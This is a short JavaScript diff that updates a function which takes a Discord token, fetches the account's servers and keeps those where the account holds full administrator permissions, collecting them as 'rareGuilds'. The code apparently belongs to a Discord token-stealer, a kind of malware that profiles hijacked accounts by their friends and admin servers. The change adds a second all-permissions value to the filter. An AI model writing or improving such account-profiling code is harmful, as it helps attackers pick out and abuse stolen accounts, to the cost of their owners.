@@ -294,7 +294,7 @@ const getFriends = async token => {
 const getServers = async token => {
     const guilds = await fetchServers(token);
 
-    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311');
+    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
         if (rareGuilds === "") {
